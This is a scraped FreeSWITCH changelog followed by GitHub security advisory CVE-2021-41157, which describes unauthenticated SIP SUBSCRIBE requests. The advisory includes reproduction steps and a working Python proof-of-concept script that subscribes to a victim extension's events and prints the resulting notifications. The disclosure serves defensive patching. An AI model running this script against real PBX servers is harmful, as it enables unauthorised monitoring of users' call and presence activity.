* [Core] Fix memory leak of local\_var\_event in switch\_ivr\_originate() when caller\_channel is not ready.
* [Core] Fix multiple missing session unlocks in switch\_core\_media.c
* [core] Fix ODBC column size performance issue
* [Core] Fix possible memory leak of switch\_core\_session\_message\_t in switch\_core\_session\_queue\_indication()
* [Core] Fix race between switch\_ivr\_park\_session() and the state machine. switch\_core\_session\_run() wants to clear the CF\_TRANSFER flag on state change while parking sets the flag.
* [Core] Fix reference counter lock order when protect/unprotect interface.
* [Core] Fix SDP parsing causing segfault.
* [Core] Fix the null char in truncated value returned by switch\_b64\_decode
* [Core] Fix wrong switch\_assert expressions in switch\_core\_session\_write\_frame()
* [Core] Fix XML generation
* [Core] Fixed issue while setting mode on reinvite or outbound direction
* [Core] Hangup call instead of crashing system on SSL\_CTX\_new failure. Improve logging.
* [Core] Improve logging in odbc with large column sizes
* [core] jira moved to github
* [Core] Make switch\_core\_media\_set\_codec() and switch\_core\_media\_set\_video\_codec() thread-safe so there is no race when a session's codec is initiated by different threads simultaneously.
* [core] native tap fix.
* [Core] ODBC: Fix large column logic and improve error handling.
* [core] Remove unused buffers and mutexes in switch\_core\_session. Remove destruction of resamplers that will already be destroyed by switch\_core\_session\_reset().
* [Core] Reuse caller profile
* [core] rtp: fix #ifdef DEBUG\_TS\_ROLLOVER
* [Core] Scheduler: Fix race between switch\_scheduler\_add\_task() and task\_thread\_loop(). Add new switch\_scheduler\_add\_task\_ex() method.
* [Core] switch\_core\_media: Correct srtp\_remote\_audio\_crypto\_key variable
* [Core] switch\_ivr\_set\_user\_xml: Buffer is wrongly truncated when it's small in get\_prefixed\_str()
* [gentls\_cert] Update message digest
* [libesl] Fix leak of esl\_event\_header\_t in esl\_event\_base\_add\_header(). Code cleanup.
* [mod\_amr] handle frame type NO\_DATA and add unit test.
* [mod\_amrwb] handle frame types SPEECH\_LOST and NO\_DATA. add unit test.
* [mod\_av] enable resampler when sample rate mismatch
* [mod\_av] fix memory leak on file playing
* [mod\_av] Fix record crash bug
* [mod\_av] remove extra space
* [mod\_av] Update error message
* [mod\_avmd, esl/python] Two build fixups
* [mod\_callcenter] fix leak
* [mod\_callcenter] Fix use of uninitialized res variable in cc\_agent\_update()
* [mod\_conference] Bridged conference did not wait it's last member before destroy and crashed.
* [mod\_conference] Fix conference api saymember wrong output message
* [mod\_curl] Avoid passing null pointer value via data parameter of do\_lookup\_url()
* [mod\_dptools] remove duplicated code
* [mod\_enum] fix mem leak - ldns\_resolver\_new() - vanilla cfg.
* [mod\_gsmopen] Fix build on Visual Studio 2019
* [mod\_httapi] Fix memory leak of dup\_creds in httapi\_sync()
* [mod\_http\_cache] crash on HTTP GET with generated AWS v4 signature
* [mod\_http\_cache] Handle error cases to avoid using uninitialized variables in aws logic.
* [mod\_http\_cache] Remove duplicate include statements
* [mod\_http\_cache] Set binary mode when downloading files in Windows
* [mod\_httpapi] Fix abs-file-cache-ttl typo
* [mod\_lcr] Fix order\_by and sql\_stream streams leaking in the case of a DB error in lcr\_load\_config()
* [mod\_loopback] Fix new\_session leak in the case of a hangup\_cause.
* [mod\_mongo, mod\_redis, mod\_voicemail] Fix leaking hash iterators.
* [mod\_opus] Do not hangup call on decode error - fix [86a5ee3](https://github.com/signalwire/freeswitch/commit/86a5ee35093bcc82313457510dcf26f4d044c9f3)
* [mod\_pgsql] Fix memory leek in the case of an empty string of err\_str in pgsql\_handle\_exec\_base\_detailed()
* [mod\_pgsql] Fix potential hang when calling PQconsumeInput() while checking if db\_is\_up().
* [mod\_pgsql] Prevent a stall of PQconsumeInput().
* [mod\_python] Fix PyObject leaks in eval\_some\_python function
* [mod\_say\_\*] fix possible memory-leak in say\_ip()
* [mod\_shout] Fix memory leak in do\_telecast
* [mod\_signalwire] Fix build with newer signalwire-c v2.0
* [mod\_sndfile] fix read sndfiles with float data
* [mod\_snom, mod\_snmp] Replace strncpy with snprintf
* [mod\_sofia] Fix memory leaks caused by improper profile destroy. Add a unit-test.
* [mod\_sofia] Fix multiple memory leaks in sofia\_presence\_handle\_sip\_i\_subscribe()
* [mod\_sofia] Fix potential leak of uuid in sofia\_event\_callback().
* [mod\_sofia] Fix recovery reinvite issue
* [mod\_sofia] fix session log
* [mod\_sofia] Fix use of uninitialized network\_ip in sofia\_handle\_sip\_r\_invite()
* [mod\_sofia] Gateways DOWN state introduced a regression: REG gateways in DOWN state could not be killed. NOREG gateways could change state in some conditions. Register and Unregister commands will now error if a gateway is NOREG.
* [mod\_sofia] Keep noreg gateways as NOREG, mark unregistered gateways as DOWN.
* [mod\_sofia] Prevent crash in sofia\_handle\_sip\_i\_state on switch\_channel\_set\_state() when PFLAG\_3PCC\_PROXY flag is set.
* [mod\_sofia] Properly handle nua events came without nua handles.
* [mod\_sofia] Protect insertion into profile->reg\_nh\_hash with a mutex.
* [mod\_sofia] Remove 'precondition' from 'Supported:' w/ 100rel
* [mod\_sofia] scan-build in sofia\_glue\_do\_invite(): Null pointer passed as an argument to a 'nonnull' parameter
* [mod\_sofia] Url encode the sip\_to\_user before using in 200 ok contact
* [mod\_sofia] Use thread-safe alternatives when destroying nua and nua\_handle references. Bump sofia-sip library requirement to version 1.13.3
* [mod\_spandsp, mod\_gsmopen] Fix typo and build with external spandsp
* [mod\_spandsp] Fix two white-space errors
* [mod\_unimrcp] Allow prosody-rate to be negative
* [mod\_v8] Fix C++ compile warning
* [mod\_video\_filter] Disable waiting video ready which blocks the channel 10 seconds in early media
* [mod\_voicemail] Fix error-case return in vm\_fsdb\_pref\_greeting\_set\_function
* [Packaging] fix debian/util.sh to work properly with new cowbuilder/pbuilder requirements for gpg keyfile formatting. add gpg to to Build-Depends as its needed to reformat the ascii armored key into the required binary format.
* [sofia-sip] Fix leaks of su\_wait\_t and epoll file descriptors.
* [test] Fix fst\_session\_park() to wait for CF\_PARK instead of CS\_PARK.
* [Unit-tests] Fix build issues in switch\_eavesdrop.c test file.
* [Unit-Tests] Fix leak of arg in the case of an error in fct\_clp\_\_parse()
* [Unit-tests] Fix previously defined AM\_\* in tests.
* [Unit-Tests] Tweak test framework, fail loading unit test when out of memory.

## Installation guides

[https://freeswitch.org/confluence/display/FREESWITCH/FreeSWITCH+1.10.x+Release+notes](https://freeswitch.org/confluence/display/FREESWITCH/FreeSWITCH%2B1.10.x%2BRelease%2Bnotes)

 Assets
2

 Loading

 üëç
2
 openspring and SHIGAOJIE reacted with thumbs up emoji

All reactions

* üëç
  2 reactions

 2 people reacted

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_42c5a67c_20250114_210601.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsignalwire%2Ffreeswitch%2Fsecurity%2Fadvisories%2FGHSA-g7xg-7c54-rmpj)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsignalwire%2Ffreeswitch%2Fsecurity%2Fadvisories%2FGHSA-g7xg-7c54-rmpj)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=signalwire%2Ffreeswitch)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[signalwire](/signalwire)
/
**[freeswitch](/signalwire/freeswitch)**
Public

* [Notifications](/login?return_to=%2Fsignalwire%2Ffreeswitch) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fsignalwire%2Ffreeswitch)
* [Star
   3.8k](/login?return_to=%2Fsignalwire%2Ffreeswitch)

* [Code](/signalwire/freeswitch)
* [Issues
  765](/signalwire/freeswitch/issues)
* [Pull requests
  268](/signalwire/freeswitch/pulls)
* [Actions](/signalwire/freeswitch/actions)
* [Wiki](/signalwire/freeswitch/wiki)
* [Security](/signalwire/freeswitch/security)
* [Insights](/signalwire/freeswitch/pulse)

Additional navigation options

* [Code](/signalwire/freeswitch)
* [Issues](/signalwire/freeswitch/issues)
* [Pull requests](/signalwire/freeswitch/pulls)
* [Actions](/signalwire/freeswitch/actions)
* [Wiki](/signalwire/freeswitch/wiki)
* [Security](/signalwire/freeswitch/security)
* [Insights](/signalwire/freeswitch/pulse)

# FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default

Moderate

[andywolk](/andywolk)
published
GHSA-g7xg-7c54-rmpj
Oct 25, 2021

## Package

FreeSWITCH
(C)

## Affected versions

<= 1.10.5

## Patched versions

1.10.7

## Description

## Description

By default, SIP requests of the type SUBSCRIBE are not authenticated in the affected versions of FreeSWITCH.

## Impact

Abuse of this security issue allows attackers to subscribe to user agent event notifications without the need to authenticate. This abuse poses privacy concerns and might lead to social engineering or similar attacks. For example, attackers may be able to monitor the status of target SIP extensions.

## How to reproduce the issue

1. Install FreeSWITCH v1.10.5 or lower
2. Run FreeSWITCH using the default configuration
3. Register as a legitimate SIP user on the FreeSWITCH server using a softphone (e.g. sip:1000@192.168.188.128 where 192.168.188.128 is your FreeSWITCH server)
4. Save the below Python script to `anon-subscribe.py`
5. Run the script from an IP address that is different from that of the softphone `python anon-subscribe.py <freeswitch_ip> <freeswitch_port> <victim_extension>`
6. Perform some operations using the softphone, such as deregistering, registering, and placing a call
7. Observe that several notifications are received by the script, exposing the actions being performed by the victim

```
import socket, string, random, re, sys

UDP_IP = sys.argv[1]
UDP_PORT = int(sys.argv[2])
EXT = sys.argv[3]
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg_template = "SUBSCRIBE sip:%s@%s;transport=UDP SIP/2.0\r\n" % (EXT, UDP_IP) + \
    "Via: SIP/2.0/UDP [ip]:[port];rport;branch=z9hG4bK-[rand]\r\n" \
    "Max-Forwards: 70\r\n" \
    "Contact: <sip:%s@[ip]:[port];transport=udp>\r\n" % (EXT, ) + \
    "To: <sip:%s@%s;transport=UDP>\r\n" % (EXT, UDP_IP) + \
    "From: <sip:9999@%s;transport=UDP>;tag=[rand]\r\n" % (UDP_IP, ) + \
    "Call-ID: [rand]\r\n" \
    "CSeq: 1 SUBSCRIBE\r\n" \
    "Expires: 600\r\n" \
    "Accept: */*\r\n" \
    "Event: [event]\r\n" \
    "Content-Length: 0\r\n" \
    "\r\n"

rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
msg = msg_template.replace('[ip]', '127.0.0.1') \
    .replace('[port]', '9999') \
        .replace('[event]', 'dialog') \
            .replace('[rand]', rand)

sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

recv=sock.recv(10240).decode()

# get rport and received from Via header
rport=re.search( r'rport=([0-9]+)', recv, re.MULTILINE).group(1)
received=re.search( r'received=([0-9\.]+)', recv, re.MULTILINE).group(1)

events = [
    'talk', 'hold', 'conference', 'presence', 'as-feature-event', 'dialog', 'line-seize',
    'call-info', 'sla', 'include-session-description', 'presence.winfo', 'message-summary',
    'refer']

for event in events:
    rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
    msg = msg_template.replace('[ip]', received) \
        .replace('[port]', rport) \
            .replace('[event]', event) \
                .replace('[rand]', rand)
    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

while True:
    print(sock.recv(10240).decode().split('\r\n\r\n')[1])
```
## Solution and recommendations

Update to FreeSWITCH version >= 1.10.7.

## Credit: Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

### Severity

Moderate

5.3

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
Low

Integrity
None

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

### CVE ID

CVE-2021-41157

### Weaknesses

[CWE-287](/advisories?query=cwe%3A287)

### Credits

* [![@sandrogauci](https://avatars.githubusercontent.com/u/1313984?s=40&v=4)](/sandrogauci)
  [sandrogauci](/sandrogauci)
  Analyst
* [![@alfredfarrugia](https://avatars.githubusercontent.com/u/75253439?s=40&v=4)](/alfredfarrugia)
  [alfredfarrugia](/alfredfarrugia)
  Analyst

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


